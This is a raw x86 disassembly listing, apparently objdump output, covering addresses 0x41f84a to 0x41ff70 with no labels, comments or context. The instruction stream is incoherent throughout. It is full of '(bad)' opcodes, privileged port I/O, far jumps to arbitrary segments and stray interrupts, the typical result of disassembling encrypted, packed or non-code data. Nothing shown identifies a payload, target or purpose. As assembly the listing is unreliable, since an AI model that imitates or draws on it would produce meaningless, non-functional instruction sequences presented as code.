  41f84a:	jge    0x41f812
  41f84c:	cld    
  41f84d:	inc    esp
  41f84e:	retf   
  41f84f:	xchg   ebx,eax
  41f850:	push   es
  41f851:	aaa    
  41f852:	cdq    
  41f853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f854:	sbb    DWORD PTR [edx],ebp
  41f856:	xor    bh,BYTE PTR [ebx+ebp*2+0x5e]
  41f85a:	or     eax,DWORD PTR [edi]
  41f85c:	push   ds
  41f85d:	push   esi
  41f85e:	out    0x8,al
  41f860:	fwait
  41f861:	lods   eax,DWORD PTR ds:[esi]
  41f862:	pushf  
  41f863:	sbb    al,0x43
  41f865:	xor    eax,DWORD PTR [esi]
  41f867:	inc    edi
  41f868:	(bad)  
  41f86a:	inc    ecx
  41f86b:	je     0x41f898
  41f86d:	jnp    0x41f8de
  41f86f:	lods   al,BYTE PTR ds:[esi]
  41f870:	fnstsw WORD PTR [ebp+0x2f]
  41f873:	push   ebx
  41f874:	mov    al,ds:0xfd4dd257
  41f879:	es (bad) 
  41f87b:	pop    ebx
  41f87c:	mov    WORD PTR [ecx-0x4],?
  41f87f:	fs enter 0x6fe3,0x49
  41f884:	push   0xffffff9f
  41f886:	(bad)  
  41f887:	jae    0x41f861
  41f889:	out    dx,al
  41f88a:	jmp    0x60b6:0xf770e66a
  41f891:	imul   ebp,DWORD PTR [ecx+0x3a],0x45
  41f895:	xchg   ebp,eax
  41f896:	xchg   BYTE PTR [esp+ecx*1+0x1b0401a9],bh
  41f89d:	or     bh,0x51
  41f8a0:	dec    edx
  41f8a1:	xchg   ebp,eax
  41f8a2:	push   ebp
  41f8a3:	dec    esp
  41f8a4:	sub    DWORD PTR [eax+0xbafffb5],ebx
  41f8aa:	ins    DWORD PTR es:[edi],dx
  41f8ab:	cmc    
  41f8ac:	adc    edi,DWORD PTR [ecx]
  41f8ae:	xchg   edx,eax
  41f8af:	fucomp st(5)
  41f8b1:	aam    0xfa
  41f8b3:	and    dh,ch
  41f8b5:	mov    ds:0x39b12a0b,eax
  41f8ba:	xlat   BYTE PTR ds:[ebx]
  41f8bb:	mov    DWORD PTR [ebp+0x7430922e],esp
  41f8c1:	push   esi
  41f8c2:	mov    cl,BYTE PTR [edx]
  41f8c4:	add    DWORD PTR [ebp-0x7ba3c9cf],ebx
  41f8ca:	retf   
  41f8cb:	pop    esi
  41f8cc:	ret    
  41f8cd:	pop    ds
  41f8ce:	mov    al,0x2e
  41f8d0:	jge    0x41f8c5
  41f8d2:	pop    ecx
  41f8d3:	lahf   
  41f8d4:	clc    
  41f8d5:	xchg   BYTE PTR [ebx+edi*2+0x4f],bl
  41f8d9:	test   eax,0x206333dd
  41f8de:	cs cmc 
  41f8e0:	mov    ebx,0x8f05724a
  41f8e5:	iret   
  41f8e6:	sti    
  41f8e7:	mov    cl,BYTE PTR [eax+0x15020a0b]
  41f8ed:	xchg   esi,eax
  41f8ee:	retf   0x39b8
  41f8f1:	aaa    
  41f8f2:	stos   DWORD PTR es:[edi],eax
  41f8f3:	sub    al,0x4a
  41f8f5:	mov    eax,ds:0x32364788
  41f8fa:	or     edx,DWORD PTR [edi]
  41f8fc:	and    BYTE PTR [edx+0x13696682],0xe7
  41f903:	fmul   DWORD PTR [edx+0x10]
  41f906:	test   BYTE PTR [ebx+0x638e77a2],ch
  41f90c:	cmp    edx,0x8a7e97ae
  41f912:	jno    0x41f96a
  41f914:	sbb    eax,0x437139db
  41f919:	or     edx,ecx
  41f91b:	xchg   ebx,eax
  41f91d:	push   0xd56f15dc
  41f922:	cs jmp 0x41f8f2
  41f925:	out    dx,eax
  41f926:	clc    
  41f927:	addr16 pop ecx
  41f929:	int3   
  41f92a:	stos   BYTE PTR es:[edi],al
  41f92b:	lods   eax,DWORD PTR ds:[esi]
  41f92c:	adc    BYTE PTR [ecx],bl
  41f92e:	inc    esi
  41f92f:	adc    ah,BYTE PTR [ebp-0x3a99d82e]
  41f935:	in     al,dx
  41f936:	daa    
  41f937:	data16 out 0x3f,al
  41f93a:	scas   al,BYTE PTR es:[edi]
  41f93b:	out    dx,al
  41f93c:	in     eax,dx
  41f93d:	daa    
  41f93e:	jae    0x41f969
  41f940:	and    al,0x73
  41f942:	mov    ?,WORD PTR [ebx]
  41f944:	and    eax,0xd064a12a
  41f949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f94a:	cli    
  41f94b:	scas   eax,DWORD PTR es:[edi]
  41f94c:	lds    esp,FWORD PTR [eax+0x28]
  41f94f:	xchg   ebx,eax
  41f950:	push   ss
  41f951:	mov    eax,ds:0xc3a670b9
  41f956:	sar    DWORD PTR [ecx-0x7d],0x8f
  41f95a:	xlat   BYTE PTR ds:[ebx]
  41f95b:	(bad)  
  41f95c:	cmp    dl,BYTE PTR [ecx+eiz*4]
  41f95f:	pusha  
  41f960:	aam    0xa4
  41f962:	test   BYTE PTR [esi-0x72],ah
  41f965:	push   ebx
  41f966:	pop    es
  41f967:	syscall 
  41f969:	dec    ebp
  41f96a:	adc    al,0x8b
  41f96c:	mov    ds:0x7a3420b0,eax
  41f971:	aad    0x5e
  41f973:	js     0x41f982
  41f975:	mov    al,ds:0x8ab6dad0
  41f97a:	lods   al,BYTE PTR ds:[esi]
  41f97b:	loopne 0x41f985
  41f97d:	add    al,0x11
  41f97f:	sbb    al,0x3e
  41f981:	mov    bh,0x65
  41f983:	aas    
  41f984:	test   DWORD PTR [esi-0x2a],ebx
  41f987:	mov    esi,0x43efd871
  41f98c:	in     eax,dx
  41f98d:	rol    BYTE PTR [ebp+0x2867c8ef],cl
  41f993:	bound  ecx,QWORD PTR [ebp+ecx*1+0x2d]
  41f997:	add    DWORD PTR [ecx+0x39],esi
  41f99a:	sar    DWORD PTR [edi],cl
  41f99c:	push   ecx
  41f99d:	shr    DWORD PTR [edx+0x17],cl
  41f9a0:	pop    ecx
  41f9a1:	adc    dh,bh
  41f9a3:	and    bh,BYTE PTR [ebp-0x2170cd5d]
  41f9a9:	call   0x14f7:0x89b5a8e1
  41f9b0:	scas   al,BYTE PTR es:[edi]
  41f9b1:	jbe    0x41f9d8
  41f9b3:	call   0x4652:0xc85e983c
  41f9ba:	imul   DWORD PTR [eax]
  41f9bc:	cmp    bl,0x66
  41f9bf:	xor    cl,BYTE PTR [ebx-0x5508bd81]
  41f9c5:	inc    eax
  41f9c6:	adc    edi,DWORD PTR [edi-0x7884ee8e]
  41f9cc:	mov    edx,0xdff54e5a
  41f9d1:	adc    eax,0x1e888d52
  41f9d6:	stos   BYTE PTR es:[edi],al
  41f9d7:	mov    al,ds:0xa4243df7
  41f9dc:	inc    ebx
  41f9dd:	xor    al,0x66
  41f9df:	in     al,dx
  41f9e0:	jae    0x41f982
  41f9e2:	and    eax,0x7731e734
  41f9e7:	mov    edi,0x6cf170a7
  41f9ec:	sub    esp,DWORD PTR [ebx+0x3f]
  41f9ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9f0:	push   es
  41f9f1:	lods   eax,DWORD PTR ds:[esi]
  41f9f2:	out    dx,al
  41f9f3:	xchg   ebx,eax
  41f9f4:	daa    
  41f9f5:	aaa    
  41f9f6:	inc    ebx
  41f9f7:	outs   dx,BYTE PTR ds:[esi]
  41f9f8:	mov    ecx,0xa87dd9b6
  41f9fd:	gs pop edi
  41f9ff:	fdivr  QWORD PTR [edx-0x53]
  41fa02:	xor    DWORD PTR [ebx+edi*4],ecx
  41fa05:	fld    TBYTE PTR [ecx-0x2dcc2a52]
  41fa0b:	mov    esi,0x20c3bfca
  41fa10:	xchg   BYTE PTR [ecx+0x10],cl
  41fa13:	xlat   BYTE PTR ss:[ebx]
  41fa15:	test   DWORD PTR [eax-0x42e55bb6],esi
  41fa1b:	inc    edi
  41fa1c:	and    esp,edx
  41fa1e:	inc    ecx
  41fa1f:	mov    al,0x78
  41fa21:	aad    0x6
  41fa23:	xor    ah,BYTE PTR [edi-0x4f71fc63]
  41fa29:	adc    eax,0x5b459cf9
  41fa2e:	cld    
  41fa2f:	ficom  WORD PTR [ebx-0x33bf5fc1]
  41fa35:	push   ss
  41fa36:	inc    edi
  41fa37:	aas    
  41fa38:	jae    0x41f9e6
  41fa3a:	jecxz  0x41f9bd
  41fa3c:	mov    WORD PTR [edi+0x5f],?
  41fa3f:	adc    al,0xf0
  41fa41:	pop    eax
  41fa42:	mov    bl,0x4c
  41fa44:	mov    edx,0x26106884
  41fa49:	cmp    dh,BYTE PTR [edx]
  41fa4b:	xchg   esi,eax
  41fa4c:	adc    edx,DWORD PTR [esi-0x2b]
  41fa4f:	dec    ecx
  41fa50:	add    ebp,DWORD PTR [eax-0x3b]
  41fa53:	mov    eax,0x7c697e03
  41fa58:	or     BYTE PTR ds:0x66a0ebc5,dh
  41fa5e:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41fa60:	fsub   DWORD PTR [ebp+edi*4-0x2]
  41fa64:	aam    0x3d
  41fa66:	out    dx,al
  41fa67:	neg    BYTE PTR gs:[edi]
  41fa6a:	ins    DWORD PTR es:[edi],dx
  41fa6b:	mov    fs,WORD PTR [ebp+0x1d]
  41fa6e:	xor    ch,BYTE PTR [edx]
  41fa70:	mov    WORD PTR [ecx],es
  41fa72:	test   al,0x76
  41fa74:	and    dh,BYTE PTR [edx]
  41fa76:	into   
  41fa77:	xlat   BYTE PTR ds:[ebx]
  41fa78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa79:	sti    
  41fa7a:	lods   eax,DWORD PTR ds:[esi]
  41fa7b:	test   al,0xe6
  41fa7d:	sar    ecx,1
  41fa7f:	cwde   
  41fa80:	pop    ds
  41fa81:	shr    BYTE PTR [edi+0x3],0xc3
  41fa85:	adc    bh,BYTE PTR [edi-0x4c]
  41fa88:	pop    ebx
  41fa89:	cmc    
  41fa8a:	out    dx,al
  41fa8b:	push   es
  41fa8c:	outs   dx,DWORD PTR ds:[esi]
  41fa8d:	out    dx,eax
  41fa8e:	in     al,0xea
  41fa90:	fldcw  WORD PTR [ecx+ebx*2+0x55e9fb7c]
  41fa97:	xchg   edx,eax
  41fa98:	fmul   QWORD PTR [esp+ebp*4-0x20]
  41fa9c:	pop    eax
  41fa9d:	or     dh,BYTE PTR [edi]
  41fa9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faa0:	sbb    ebp,esp
  41faa2:	inc    edx
  41faa3:	jbe    0x41fa53
  41faa5:	loope  0x41fa9b
  41faa7:	dec    ebp
  41faa8:	retf   0x1b47
  41faab:	cmp    esi,DWORD PTR ds:0xab979685
  41fab1:	pusha  
  41fab2:	test   al,0x1e
  41fab4:	or     al,0xb4
  41fab6:	rcr    DWORD PTR [esi],cl
  41fab8:	shl    BYTE PTR [ebx],cl
  41faba:	lock ss bswap edx
  41fabe:	jns    0x41fa5d
  41fac0:	jmp    0x4d58138a
  41fac5:	aas    
  41fac6:	test   BYTE PTR ds:0xd1a3322,dl
  41facc:	popa   
  41facd:	xor    ebp,DWORD PTR [edi-0x2f]
  41fad0:	fimul  WORD PTR [edx+0x2d]
  41fad3:	int3   
  41fad4:	cmp    eax,0x103a30e5
  41fad9:	xchg   edi,eax
  41fada:	int    0x88
  41fadc:	add    bl,0xca
  41fadf:	mov    WORD PTR [ebx],ds
  41fae1:	iret   
  41fae2:	shr    DWORD PTR [ebp-0x72],1
  41fae5:	sbb    edx,DWORD PTR [eax+0x7fae8c75]
  41faeb:	xchg   ecx,eax
  41faec:	dec    edi
  41faed:	repnz repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faf0:	jne    0x41fb71
  41faf2:	fldenv [edx]
  41faf4:	ds rol DWORD PTR fs:[edx],cl
  41faf8:	fwait
  41faf9:	jl     0x41fb5c
  41fafb:	inc    esp
  41fafc:	cmp    eax,0x1d6f51d9
  41fb01:	xor    BYTE PTR [edx+eax*1+0x7a],0x2f
  41fb06:	push   edi
  41fb07:	in     eax,0x33
  41fb09:	push   edi
  41fb0a:	push   es
  41fb0b:	js     0x41fb23
  41fb0d:	iret   
  41fb0e:	or     eax,edi
  41fb10:	mov    esi,0xe09d6270
  41fb15:	mov    ch,0x6a
  41fb17:	in     eax,dx
  41fb18:	shl    BYTE PTR [edi+0x784a7e09],cl
  41fb1e:	adc    al,0xb4
  41fb20:	sub    eax,0x8d2f7f4b
  41fb25:	sub    BYTE PTR [ebx],dl
  41fb27:	lods   al,BYTE PTR ds:[esi]
  41fb28:	retf   0x1cc9
  41fb2b:	in     eax,0x93
  41fb2d:	xor    BYTE PTR [edi],bh
  41fb2f:	push   0xfffffff3
  41fb31:	mov    ds:0xf8c6552b,eax
  41fb36:	js     0x41fb0c
  41fb38:	inc    edx
  41fb39:	test   al,0xcc
  41fb3b:	iret   
  41fb3c:	push   eax
  41fb3d:	fwait
  41fb3e:	je     0x41fb82
  41fb40:	pop    edi
  41fb41:	mov    edi,0x5973ee4e
  41fb46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb47:	in     al,dx
  41fb48:	inc    edi
  41fb49:	ss and eax,0xe2da14bd
  41fb4f:	and    al,0x5b
  41fb51:	es rol bh,1
  41fb54:	loop   0x41fb23
  41fb56:	fnsave [ecx-0x64]
  41fb59:	cmp    edi,ecx
  41fb5b:	popa   
  41fb5c:	jle    0x41fb89
  41fb5e:	(bad)  
  41fb5f:	fbld   TBYTE PTR [esp+ebp*8+0x7a]
  41fb63:	xor    al,0x95
  41fb65:	cmp    eax,0x7d9d5d0f
  41fb6a:	sti    
  41fb6b:	call   0x27d9:0x2e9e6f36
  41fb72:	mov    WORD PTR [ebx-0x19],?
  41fb75:	nop
  41fb76:	pusha  
  41fb77:	mov    esp,edi
  41fb79:	mov    ch,0x8b
  41fb7b:	jecxz  0x41fba9
  41fb7d:	std    
  41fb7e:	mov    ds,WORD PTR [eax+0x6e]
  41fb81:	je     0x41fb17
  41fb83:	xchg   ecx,eax
  41fb84:	pushf  
  41fb85:	imul   ebx,DWORD PTR [edx],0x15a540c5
  41fb8b:	xchg   ebp,eax
  41fb8c:	(bad)  
  41fb8d:	out    0x5a,al
  41fb8f:	add    DWORD PTR [edx],ecx
  41fb91:	adc    edi,eax
  41fb93:	ror    BYTE PTR [ecx-0x73],0x35
  41fb97:	or     esi,DWORD PTR [ecx+esi*2-0x70]
  41fb9b:	xchg   DWORD PTR [edi],edx
  41fb9d:	pushf  
  41fb9e:	imul   eax,DWORD PTR [ecx],0x45cddd48
  41fba4:	mov    dh,0x75
  41fba6:	jmp    0x41fc08
  41fba8:	mov    dl,0xa3
  41fbaa:	jge    0x41fb39
  41fbac:	stc    
  41fbad:	mov    ch,0x2b
  41fbaf:	add    BYTE PTR [eax+0x21],0x3f
  41fbb3:	mov    eax,0x32288e81
  41fbb8:	pop    ds
  41fbb9:	adc    ebp,DWORD PTR [ebx-0x6b0c9290]
  41fbbf:	stc    
  41fbc0:	ss fs and eax,0xb9cc7be2
  41fbc7:	dec    DWORD PTR [eax+0x17be4a73]
  41fbcd:	inc    ecx
  41fbce:	adc    bl,BYTE PTR [ebx]
  41fbd0:	push   ecx
  41fbd1:	pop    eax
  41fbd2:	lods   al,BYTE PTR ds:[esi]
  41fbd3:	xor    eax,0x90bc8f4f
  41fbd8:	lock cmp ch,BYTE PTR [ecx-0x80]
  41fbdc:	mov    esi,DWORD PTR [esi-0x16]
  41fbdf:	jmp    0xa3753b91
  41fbe4:	xchg   dh,cl
  41fbe6:	jge    0x41fb6a
  41fbe8:	jge    0x41fbf2
  41fbea:	fst    DWORD PTR [edx-0x70]
  41fbed:	test   bl,dh
  41fbef:	(bad)  
  41fbf0:	bound  edi,QWORD PTR [ebx]
  41fbf2:	xor    al,0x82
  41fbf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbf5:	mov    ecx,0xf4ea2c3a
  41fbfa:	ins    DWORD PTR es:[edi],dx
  41fbfb:	mov    ebp,0x463a4427
  41fc00:	cmc    
  41fc01:	and    DWORD PTR [ecx],edi
  41fc03:	xor    ch,BYTE PTR [esi]
  41fc05:	sbb    DWORD PTR [esi+0x1a],edi
  41fc08:	nop
  41fc09:	push   0x28
  41fc0b:	test   DWORD PTR [edx+0x1e32fd1a],edi
  41fc11:	call   0x42a2ea9c
  41fc16:	int    0x88
  41fc18:	std    
  41fc19:	mov    al,0xe
  41fc1b:	loopne 0x41fbba
  41fc1d:	es cwde 
  41fc1f:	dec    edi
  41fc20:	dec    ecx
  41fc21:	clc    
  41fc22:	dec    esi
  41fc23:	loopne 0x41fc0d
  41fc25:	sbb    ebx,DWORD PTR [esi+ecx*8-0x62ed2f50]
  41fc2c:	fs xchg edx,eax
  41fc2e:	or     eax,0x8629a909
  41fc33:	aas    
  41fc34:	jp     0x41fc62
  41fc36:	pop    esp
  41fc37:	les    edi,FWORD PTR [ebp+0x49c0e93c]
  41fc3d:	(bad)  
  41fc3e:	mov    ss,WORD PTR [ebx]
  41fc40:	lods   al,BYTE PTR ds:[esi]
  41fc41:	cmp    ebx,DWORD PTR [edi+0x690b5f11]
  41fc47:	or     BYTE PTR [edi+0x7],dl
  41fc4a:	xor    ebp,DWORD PTR [eax-0x45d5a4bb]
  41fc50:	(bad)  
  41fc52:	(bad)  
  41fc53:	pop    ecx
  41fc54:	pop    es
  41fc55:	jnp    0x41fc96
  41fc57:	jb     0x41fc05
  41fc59:	jno    0x41fc1f
  41fc5b:	shl    ebx,1
  41fc5d:	mov    DWORD PTR [edx],esi
  41fc5f:	push   0xfef6961f
  41fc64:	retf   
  41fc65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc66:	das    
  41fc67:	es fwait
  41fc69:	cmp    bl,BYTE PTR [edx+eax*8+0x4064aec3]
  41fc70:	cld    
  41fc71:	fisubr DWORD PTR [edx]
  41fc73:	cmp    ebp,eax
  41fc75:	mov    cl,0x11
  41fc77:	mov    ?,WORD PTR [edi+0x6f8bf2fa]
  41fc7d:	fisubr WORD PTR [esi]
  41fc7f:	test   al,0x77
  41fc81:	popa   
  41fc82:	pop    ebp
  41fc83:	sbb    DWORD PTR [esi],ecx
  41fc85:	pushf  
  41fc86:	and    al,0xa7
  41fc88:	cwde   
  41fc89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc8a:	ror    DWORD PTR [esi],cl
  41fc8c:	test   eax,0x3fe1ef12
  41fc91:	cmp    BYTE PTR [eax-0x62],0x97
  41fc95:	imul   ecx,DWORD PTR [ecx],0xdd6476a0
  41fc9b:	mov    bl,0x84
  41fc9d:	add    DWORD PTR [esi-0x3d17bef3],edi
  41fca3:	dec    edi
  41fca4:	dec    esp
  41fca5:	je     0x41fcc1
  41fca7:	aas    
  41fca8:	xor    al,0x79
  41fcaa:	int3   
  41fcab:	in     al,0x6a
  41fcad:	test   al,0xe1
  41fcaf:	je     0x41fccf
  41fcb1:	inc    eax
  41fcb2:	sbb    al,BYTE PTR [edx+0x56]
  41fcb5:	icebp  
  41fcb6:	push   ebp
  41fcb7:	xchg   ecx,eax
  41fcb8:	mov    ds:0x968d54ce,al
  41fcbd:	mov    bh,0xcb
  41fcbf:	xchg   ecx,eax
  41fcc0:	daa    
  41fcc1:	xlat   BYTE PTR ds:[ebx]
  41fcc2:	sti    
  41fcc3:	mov    edi,0xc7ce3ca8
  41fcc8:	daa    
  41fcc9:	imul   esp,edx,0x21
  41fccc:	dec    eax
  41fccd:	mov    ah,0x66
  41fccf:	mov    ebp,0x18d70433
  41fcd4:	cdq    
  41fcd5:	mov    cl,0x95
  41fcd7:	ret    0xb428
  41fcda:	out    0x8e,al
  41fcdc:	xchg   esi,eax
  41fcdd:	bound  ebx,QWORD PTR [ecx+0x4a]
  41fce0:	outs   dx,DWORD PTR ds:[esi]
  41fce1:	xchg   ecx,eax
  41fce2:	push   ebp
  41fce3:	mov    edx,0xe5816fa6
  41fce8:	inc    esi
  41fce9:	int    0xce
  41fceb:	push   es
  41fcec:	movhps xmm2,QWORD PTR ds:0xea4312d9
  41fcf3:	push   esi
  41fcf4:	(bad)  
  41fcf5:	or     eax,0x3de5b98b
  41fcfa:	and    DWORD PTR [esi+0x69],edi
  41fcfd:	mov    edi,0x14c796a4
  41fd02:	(bad)
  41fd07:	rcr    DWORD PTR [esi+0x2ff64439],1
  41fd0d:	rcr    DWORD PTR [esi+0x4e],0x16
  41fd11:	adc    ecx,esi
  41fd13:	sbb    BYTE PTR [ecx+ebp*1+0x4802a781],ch
  41fd1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd1b:	aas    
  41fd1c:	cmp    cl,bl
  41fd1e:	clc    
  41fd1f:	push   cs
  41fd20:	xchg   BYTE PTR [edx+0x6b],ch
  41fd23:	(bad)  
  41fd25:	cmp    eax,0x2efba71e
  41fd2a:	adc    eax,0x9217f436
  41fd2f:	dec    esp
  41fd30:	pop    ebp
  41fd31:	outs   dx,DWORD PTR ds:[esi]
  41fd32:	aad    0x62
  41fd34:	arpl   sp,sp
  41fd36:	push   ebx
  41fd37:	cmp    BYTE PTR [edx-0x58f708cd],bh
  41fd3d:	push   eax
  41fd3e:	(bad)
  41fd41:	add    eax,0xde42448e
  41fd46:	es sbb al,0x9a
  41fd49:	stos   DWORD PTR es:[edi],eax
  41fd4a:	jge    0x41fdb9
  41fd4c:	xor    al,0x9c
  41fd4e:	pop    ecx
  41fd4f:	ret    0x2af2
  41fd52:	fs popf 
  41fd54:	enter  0x7ffb,0x17
  41fd58:	(bad)  
  41fd5c:	jl     0x41fcf9
  41fd5e:	int3   
  41fd5f:	jbe    0x41fcf9
  41fd61:	popf   
  41fd62:	mov    bl,0xdb
  41fd64:	adc    al,BYTE PTR [esi]
  41fd66:	shl    esi,0xda
  41fd69:	out    0xad,eax
  41fd6b:	pop    edx
  41fd6c:	rcr    BYTE PTR [eax+0x23],1
  41fd6f:	iret   
  41fd70:	das    
  41fd71:	lock xchg ecx,ecx
  41fd74:	add    dl,0x74
  41fd77:	std    
  41fd78:	jp     0x41fd74
  41fd7a:	jno    0x41fdb9
  41fd7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd7d:	enter  0x99c5,0x4a
  41fd81:	push   cs
  41fd82:	sbb    eax,0x2b9336cb
  41fd87:	retf   0x695f
  41fd8a:	fs jae 0x41fd8c
  41fd8d:	aas    
  41fd8e:	(bad)  
  41fd8f:	pop    esi
  41fd90:	(bad)  
  41fd91:	aaa    
  41fd92:	lahf   
  41fd93:	cmp    BYTE PTR ds:0x882b249f,bh
  41fd99:	in     al,dx
  41fd9a:	add    DWORD PTR [edx],esp
  41fd9c:	mov    ebx,0x3d8ee656
  41fda1:	shl    BYTE PTR [edx],1
  41fda3:	or     edx,edi
  41fda5:	inc    esi
  41fda6:	fsubr  st(6),st
  41fda8:	clc    
  41fda9:	pop    eax
  41fdaa:	aaa    
  41fdab:	pop    ecx
  41fdac:	sbb    WORD PTR [eax],si
  41fdaf:	mov    al,ah
  41fdb1:	(bad)  [esi+0x56ba0ad7]
  41fdb7:	lock pop esp
  41fdb9:	addr16 xor al,0x55
  41fdbc:	shr    DWORD PTR [edx],1
  41fdbe:	sub    ebx,esi
  41fdc0:	dec    esi
  41fdc1:	imul   ecx,DWORD PTR [esi+eax*1-0x5ab686d],0x42607e23
  41fdcc:	mov    ebp,0xb72e57c6
  41fdd1:	in     al,dx
  41fdd2:	aas    
  41fdd3:	mov    ebx,0x382f6465
  41fdd8:	jg     0x41fe3f
  41fdda:	or     al,0x95
  41fddc:	imul   ecx,DWORD PTR [edi+eax*1-0x69c06d4d],0x3b7fe9ca
  41fde7:	mov    al,0x21
  41fde9:	lds    ebx,FWORD PTR [edx]
  41fdeb:	mov    ch,0xb1
  41fded:	mov    eax,ds:0x5abb1b0f
  41fdf2:	push   ds
  41fdf3:	aam    0x95
  41fdf5:	outs   dx,BYTE PTR ds:[esi]
  41fdf6:	ror    BYTE PTR [ebx+0x25],0xa6
  41fdfa:	in     al,dx
  41fdfb:	add    al,0x4
  41fdfd:	cmp    ecx,DWORD PTR [ecx+eax*8-0xcf5b905]
  41fe04:	hlt    
  41fe05:	mov    edx,0x43cf0985
  41fe0a:	jmp    0xc819c88f
  41fe0f:	(bad)  
  41fe11:	push   edi
  41fe12:	sti    
  41fe13:	out    0x21,eax
  41fe15:	mov    cl,0x98
  41fe17:	enter  0xfbdb,0xa5
  41fe1b:	rcl    BYTE PTR [eax-0x6522d532],1
  41fe21:	xchg   ebp,eax
  41fe22:	and    al,bh
  41fe24:	lods   eax,DWORD PTR ds:[esi]
  41fe25:	mov    al,ds:0x5de03008
  41fe2a:	push   cs
  41fe2b:	mov    ecx,0x922efce7
  41fe30:	int3   
  41fe31:	popf   
  41fe32:	cwde   
  41fe33:	(bad)  
  41fe34:	sub    al,0x22
  41fe36:	sbb    BYTE PTR [edi+0x517fbf43],0xa
  41fe3d:	out    0x46,eax
  41fe3f:	jg     0x41fe30
  41fe41:	enter  0x8c90,0xca
  41fe45:	dec    esi
  41fe46:	loope  0x41fe4b
  41fe48:	aad    0x24
  41fe4a:	out    0x66,eax
  41fe4c:	adc    BYTE PTR [edi-0x2302f26d],0xe5
  41fe53:	sbb    esp,eax
  41fe55:	sar    BYTE PTR [esi-0x21653916],1
  41fe5b:	inc    edi
  41fe5c:	repz (bad) 
  41fe5e:	mov    ebp,0x1c033807
  41fe63:	adc    ah,BYTE PTR [edx+ecx*4+0x26]
  41fe67:	push   eax
  41fe68:	xchg   BYTE PTR [edi-0x121b86cc],bl
  41fe6e:	jmp    0x88eb4e45
  41fe73:	jl     0x41fdf8
  41fe75:	int    0xd7
  41fe77:	in     al,0xb2
  41fe79:	xor    BYTE PTR [esi-0x30],bl
  41fe7c:	inc    esi
  41fe7d:	jge    0x41fe7e
  41fe7f:	sub    DWORD PTR [eax+0x6c],ebx
  41fe82:	or     esp,DWORD PTR ds:0x3c5fd967
  41fe88:	cmp    eax,edi
  41fe8a:	inc    BYTE PTR [ebx]
  41fe8c:	jmp    0x41fe49
  41fe8e:	inc    edx
  41fe8f:	call   0x4633cf14
  41fe94:	push   esp
  41fe95:	jmp    0xe6c5c126
  41fe9a:	jns    0x41fe6e
  41fe9c:	ffree  st(4)
  41fe9e:	pop    edi
  41fe9f:	or     DWORD PTR [eax],edi
  41fea1:	inc    edi
  41fea2:	mov    al,0x91
  41fea4:	sub    esi,esp
  41fea6:	retf   
  41fea7:	in     al,0xb1
  41fea9:	sub    eax,0x479ee028
  41feae:	sub    BYTE PTR [ecx+esi*1-0x68],dl
  41feb2:	cmovs  esi,edi
  41feb5:	out    dx,al
  41feb6:	add    dh,dh
  41feb8:	or     eax,DWORD PTR [edx+0x12]
  41febb:	sahf   
  41febc:	sub    eax,0x54695505
  41fec1:	outs   dx,DWORD PTR ds:[esi]
  41fec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fec3:	fs pop ds
  41fec5:	das    
  41fec6:	jp     0x41fef9
  41fec8:	cdq    
  41fec9:	call   0xa1f9:0xb49a3595
  41fed0:	add    BYTE PTR [ebx],cl
  41fed2:	pop    esi
  41fed3:	stos   BYTE PTR es:[edi],al
  41fed4:	mov    al,ds:0x9146f353
  41fed9:	sbb    al,0x47
  41fedb:	rcl    BYTE PTR [eax],cl
  41fedd:	push   eax
  41fede:	push   ds
  41fedf:	jno    0xd791f63d
  41fee5:	adc    eax,0xed4303e0
  41feea:	ffreep st(3)
  41feec:	inc    eax
  41feed:	mov    DWORD PTR fs:[edi],edx
  41fef0:	cmp    BYTE PTR [ebx+0x42],ch
  41fef3:	lods   al,BYTE PTR ds:[esi]
  41fef4:	lahf   
  41fef5:	or     BYTE PTR [esi+0x3d],dh
  41fef8:	mov    esi,ebp
  41fefa:	ss xchg esp,eax
  41fefc:	shl    BYTE PTR [edi+edx*4],0xe5
  41ff00:	into   
  41ff01:	(bad)  
  41ff02:	out    dx,al
  41ff03:	data16 jo 0x41ff7c
  41ff06:	mov    ch,0x5a
  41ff08:	ss cld 
  41ff0a:	or     eax,0x2abdab7e
  41ff0f:	pop    es
  41ff10:	aas    
  41ff11:	(bad)  
  41ff12:	(bad)  [edi-0x61]
  41ff15:	fdivr  st,st(2)
  41ff17:	adc    DWORD PTR [ebp-0x1608cdcc],0xffffffc1
  41ff1e:	push   ebx
  41ff1f:	add    eax,0x125cbc2c
  41ff24:	pop    edx
  41ff25:	mov    eax,ds:0x8deb1341
  41ff2a:	outs   dx,DWORD PTR ds:[esi]
  41ff2b:	js     0x41ff86
  41ff2d:	retf   
  41ff2e:	sub    eax,0xbef114f5
  41ff33:	mov    es,ebx
  41ff35:	mov    bl,0xe9
  41ff37:	stc    
  41ff38:	das    
  41ff39:	sbb    bl,BYTE PTR [edi]
  41ff3b:	inc    ebp
  41ff3c:	lods   al,BYTE PTR ds:[esi]
  41ff3d:	(bad)  
  41ff3e:	jno    0x41ff34
  41ff40:	pop    ebp
  41ff41:	mov    cl,0x9b
  41ff43:	mov    edi,0xb1a98fb3
  41ff48:	push   edx
  41ff49:	pop    edx
  41ff4a:	mov    ebx,0x159697b5
  41ff4f:	sub    ecx,0x3985cb4b
  41ff55:	(bad)  
  41ff57:	xchg   esp,eax
  41ff58:	loope  0x41ff52
  41ff5a:	xchg   ebx,eax
  41ff5b:	fwait
  41ff5c:	xchg   edx,eax
  41ff5d:	nop
  41ff5e:	xchg   esi,eax
  41ff5f:	out    0x17,al
  41ff61:	jnp    0x41ff2f
  41ff63:	jmp    0x404a5616
  41ff68:	int3   
  41ff69:	push   cs
  41ff6a:	ret    0xe5e6
  41ff6d:	xchg   edx,eax
  41ff6e:	cmp    DWORD PTR [ebx],edi
  41ff70:	push   0xffffffe2
